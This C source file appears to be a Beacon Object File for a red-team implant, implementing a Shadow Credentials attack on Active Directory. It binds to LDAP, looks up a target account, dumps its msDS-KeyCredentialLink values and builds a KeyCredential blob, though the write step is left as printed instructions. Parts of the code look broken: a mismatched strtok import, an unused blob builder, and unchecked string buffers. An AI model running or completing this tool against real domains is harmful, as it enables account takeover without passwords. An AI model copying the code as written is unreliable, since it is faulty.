/*
 * krb_shadowcred - Shadow Credentials Attack
 *
 * Adds a "shadow" credential to a target account's msDS-KeyCredentialLink
 * attribute, allowing PKINIT authentication without knowing the password.
 *
 * Usage: krb_shadowcred /target:COMPUTER$ [/domain:DOMAIN] [/dc:DC]
 *
 * Note: Requires write access to the target's msDS-KeyCredentialLink attribute
 */

/* Include krb5_struct.h first - it includes winsock2.h before windows.h */
#include "include/krb5_struct.h"
#include "include/krb5_utils.h"
#include "beacon.h"

/* Additional declarations for LDAP */
DECLSPEC_IMPORT PVOID WINAPI WLDAP32$ldap_initA(PCHAR, ULONG);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_bind_sA(PVOID, PCHAR, PCHAR, ULONG);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_unbind(PVOID);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_search_sA(PVOID, PCHAR, ULONG, PCHAR, PCHAR*, ULONG, PVOID*);
DECLSPEC_IMPORT PVOID WINAPI WLDAP32$ldap_first_entry(PVOID, PVOID);
DECLSPEC_IMPORT PCHAR* WINAPI WLDAP32$ldap_get_valuesA(PVOID, PVOID, PCHAR);
DECLSPEC_IMPORT struct berval** WINAPI WLDAP32$ldap_get_values_lenA(PVOID, PVOID, PCHAR);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_value_free_len(struct berval**);
DECLSPEC_IMPORT VOID WINAPI WLDAP32$ldap_value_freeA(PCHAR*);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_msgfree(PVOID);
DECLSPEC_IMPORT PCHAR WINAPI WLDAP32$ldap_get_dnA(PVOID, PVOID);
DECLSPEC_IMPORT VOID WINAPI WLDAP32$ldap_memfreeA(PCHAR);

/* Additional declarations for missing symbols */
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetTickCount(void);
DECLSPEC_IMPORT char* __cdecl MSVCRT$MSVCRT$strtok(char*, const char*);

/* berval structure */
typedef struct berval {
    ULONG bv_len;
    PCHAR bv_val;
} BERVAL;

/* LDAP constants */
#define LDAP_SCOPE_SUBTREE 2
#define LDAP_AUTH_NEGOTIATE 0x0486
#define LDAP_PORT 389
#define LDAP_SUCCESS 0

/* KeyCredential structure version */
#define KEY_CREDENTIAL_VERSION 0x00000200

/* Key usage values */
#define KEY_USAGE_NGC 0x01
#define KEY_USAGE_FIDO 0x07
#define KEY_USAGE_FEK 0x08

/* Helper: allocate and base64 encode using krb5_utils functions */
static char* b64_encode_alloc(const BYTE* data, size_t len) {
    size_t out_len = 4 * ((len + 2) / 3) + 1;
    char* encoded = (char*)malloc(out_len);
    if (!encoded) return NULL;
    base64_encode(data, len, encoded);
    return encoded;
}

/* Generate random bytes */
static void generate_random(BYTE* buf, size_t len) {
    HCRYPTPROV hProv;
    if (ADVAPI32$CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        ADVAPI32$CryptGenRandom(hProv, (DWORD)len, buf);
        ADVAPI32$CryptReleaseContext(hProv, 0);
    } else {
        /* Fallback to basic random */
        for (size_t i = 0; i < len; i++) {
            buf[i] = (BYTE)(KERNEL32$GetTickCount() ^ (i * 17));
        }
    }
}

/* Create a minimal KeyCredential blob */
static size_t create_key_credential(BYTE* out, size_t maxLen, BYTE* keyId, BYTE* publicKey, size_t pubKeyLen) {
    size_t offset = 0;

    /* Version (4 bytes) */
    *(DWORD*)(out + offset) = KEY_CREDENTIAL_VERSION;
    offset += 4;

    /* KeyID Entry: Type=0x01, Length, Value */
    out[offset++] = 0x01;  /* KeyID type */
    out[offset++] = 0x10;  /* Length: 16 bytes */
    memcpy(out + offset, keyId, 16);
    offset += 16;

    /* Key Material Entry: Type=0x03 */
    out[offset++] = 0x03;  /* Key material type */
    out[offset++] = (BYTE)(pubKeyLen & 0xFF);
    out[offset++] = (BYTE)((pubKeyLen >> 8) & 0xFF);
    memcpy(out + offset, publicKey, pubKeyLen);
    offset += pubKeyLen;

    /* Key Usage Entry: Type=0x04 */
    out[offset++] = 0x04;  /* Key usage type */
    out[offset++] = 0x01;  /* Length: 1 byte */
    out[offset++] = KEY_USAGE_NGC;

    /* Key Source: Type=0x05 */
    out[offset++] = 0x05;  /* Key source type */
    out[offset++] = 0x01;  /* Length: 1 byte */
    out[offset++] = 0x00;  /* AD */

    /* Device ID: Type=0x06 */
    out[offset++] = 0x06;  /* Device ID type */
    out[offset++] = 0x10;  /* Length: 16 bytes (GUID) */
    generate_random(out + offset, 16);
    offset += 16;

    /* Custom Key Info: Type=0x07 */
    out[offset++] = 0x07;
    out[offset++] = 0x02;
    out[offset++] = 0x01;  /* Version */
    out[offset++] = 0x00;  /* Flags */

    /* Last Logon Time: Type=0x08 */
    FILETIME ft;
    KERNEL32$GetSystemTimeAsFileTime(&ft);
    out[offset++] = 0x08;
    out[offset++] = 0x08;
    memcpy(out + offset, &ft, 8);
    offset += 8;

    /* Creation Time: Type=0x09 */
    out[offset++] = 0x09;
    out[offset++] = 0x08;
    memcpy(out + offset, &ft, 8);
    offset += 8;

    return offset;
}


void go(char* args, int alen) {
    formatp output;
    ARG_PARSER parser;
    char* target = NULL;
    char* domain = NULL;
    char* dc = NULL;
    char* listonly = NULL;

    BeaconFormatAlloc(&output, 32768);
    arg_init(&parser, args, alen);

    BeaconFormatPrintf(&output, "\n[*] Action: Shadow Credentials\n\n");


    target = arg_get(&parser, "target");
    domain = arg_get(&parser, "domain");
    dc = arg_get(&parser, "dc");
    listonly = arg_get(&parser, "list");

    if (!target && !listonly) {
        BeaconFormatPrintf(&output, "[-] Error: /target:ACCOUNT required\n\n");
        BeaconFormatPrintf(&output, "Usage:\n");
        BeaconFormatPrintf(&output, "  List:   krb_shadowcred /target:COMPUTER$ /list\n");
        BeaconFormatPrintf(&output, "  Add:    krb_shadowcred /target:COMPUTER$ [/domain:DOMAIN] [/dc:DC]\n\n");
        BeaconFormatPrintf(&output, "This attack adds a shadow credential to the target's\n");
        BeaconFormatPrintf(&output, "msDS-KeyCredentialLink attribute for PKINIT authentication.\n\n");
        BeaconFormatPrintf(&output, "Requirements:\n");
        BeaconFormatPrintf(&output, "  - Write access to target's msDS-KeyCredentialLink\n");
        BeaconFormatPrintf(&output, "  - Domain functional level 2016 or higher\n");
        BeaconFormatPrintf(&output, "  - AD CS for PKINIT (or shadow creds + U2U)\n");
        goto cleanup;
    }

    if (!domain) {
        domain = get_domain_from_env();
        if (!domain) {
            BeaconFormatPrintf(&output, "[-] Error: Could not determine domain. Use /domain:DOMAIN\n");
            goto cleanup;
        }
    }

    if (!dc) {
        dc = domain;  /* Try using domain name as DC */
    }

    BeaconFormatPrintf(&output, "[*] Target: %s\n", target);
    BeaconFormatPrintf(&output, "[*] Domain: %s\n", domain);
    BeaconFormatPrintf(&output, "[*] DC: %s\n", dc);

    /* Connect via LDAP */
    BeaconFormatPrintf(&output, "\n[*] Connecting to LDAP...\n");

    PVOID ldap = WLDAP32$ldap_initA(dc, LDAP_PORT);
    if (!ldap) {
        BeaconFormatPrintf(&output, "[-] Failed to initialize LDAP connection\n");
        goto cleanup;
    }

    ULONG ldapResult = WLDAP32$ldap_bind_sA(ldap, NULL, NULL, LDAP_AUTH_NEGOTIATE);
    if (ldapResult != LDAP_SUCCESS) {
        BeaconFormatPrintf(&output, "[-] LDAP bind failed: %d\n", ldapResult);
        WLDAP32$ldap_unbind(ldap);
        goto cleanup;
    }

    BeaconFormatPrintf(&output, "[+] LDAP connected\n");

    /* Build search base from domain */
    char searchBase[512];
    char* domainCopy = (char*)malloc(strlen(domain) + 1);
    strcpy(domainCopy, domain);

    strcpy(searchBase, "DC=");
    char* part = MSVCRT$strtok(domainCopy, ".");
    int first = 1;
    while (part) {
        if (!first) strcat(searchBase, ",DC=");
        strcat(searchBase, part);
        first = 0;
        part = MSVCRT$strtok(NULL, ".");
    }
    free(domainCopy);

    /* Search for target */
    char filter[256];
    sprintf(filter, "(sAMAccountName=%s)", target);

    char* attrs[] = { "distinguishedName", "msDS-KeyCredentialLink", NULL };
    PVOID searchResult = NULL;

    BeaconFormatPrintf(&output, "[*] Searching for %s...\n", target);

    ldapResult = WLDAP32$ldap_search_sA(ldap, searchBase, LDAP_SCOPE_SUBTREE,
                                         filter, attrs, 0, &searchResult);

    if (ldapResult != LDAP_SUCCESS) {
        BeaconFormatPrintf(&output, "[-] LDAP search failed: %d\n", ldapResult);
        WLDAP32$ldap_unbind(ldap);
        goto cleanup;
    }

    PVOID entry = WLDAP32$ldap_first_entry(ldap, searchResult);
    if (!entry) {
        BeaconFormatPrintf(&output, "[-] Target not found\n");
        WLDAP32$ldap_msgfree(searchResult);
        WLDAP32$ldap_unbind(ldap);
        goto cleanup;
    }

    /* Get DN */
    PCHAR dn = WLDAP32$ldap_get_dnA(ldap, entry);
    BeaconFormatPrintf(&output, "[+] Found: %s\n", dn);

    /* Get existing KeyCredentialLink values */
    struct berval** keyCredVals = WLDAP32$ldap_get_values_lenA(ldap, entry, "msDS-KeyCredentialLink");

    if (keyCredVals && keyCredVals[0]) {
        BeaconFormatPrintf(&output, "\n[*] Existing KeyCredentialLink values:\n");
        for (int i = 0; keyCredVals[i]; i++) {
            char* b64 = b64_encode_alloc((BYTE*)keyCredVals[i]->bv_val, keyCredVals[i]->bv_len);
            if (b64) {
                BeaconFormatPrintf(&output, "  [%d] Length: %d bytes\n", i, keyCredVals[i]->bv_len);
                BeaconFormatPrintf(&output, "      B64: %.60s...\n", b64);
                free(b64);
            }
        }
        WLDAP32$ldap_value_free_len(keyCredVals);
    } else {
        BeaconFormatPrintf(&output, "[*] No existing KeyCredentialLink values\n");
    }

    if (listonly) {
        BeaconFormatPrintf(&output, "\n[*] List only - not adding credentials\n");
    } else {
        BeaconFormatPrintf(&output, "\n[*] Shadow credential attack requires:\n");
        BeaconFormatPrintf(&output, "    1. Generate RSA key pair\n");
        BeaconFormatPrintf(&output, "    2. Create KeyCredential blob with public key\n");
        BeaconFormatPrintf(&output, "    3. LDAP modify msDS-KeyCredentialLink\n");
        BeaconFormatPrintf(&output, "    4. Use private key for PKINIT AS-REQ\n");
        BeaconFormatPrintf(&output, "\n[!] Full implementation requires RSA key generation\n");
        BeaconFormatPrintf(&output, "[!] Consider using Whisker or PyWhisker for this attack\n");

        /* Generate a sample KeyCredential for demonstration */
        BYTE keyId[16];
        BYTE dummyPubKey[32];
        generate_random(keyId, 16);
        generate_random(dummyPubKey, 32);

        BeaconFormatPrintf(&output, "\n[*] Sample KeyID (would be used): ");
        for (int i = 0; i < 16; i++) {
            BeaconFormatPrintf(&output, "%02X", keyId[i]);
        }
        BeaconFormatPrintf(&output, "\n");
    }

    WLDAP32$ldap_memfreeA(dn);
    WLDAP32$ldap_msgfree(searchResult);
    WLDAP32$ldap_unbind(ldap);

cleanup:
    if (target) free(target);
    if (domain) free(domain);
    if (dc) free(dc);
    if (listonly) free(listonly);

    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
    BeaconFormatFree(&output);
}
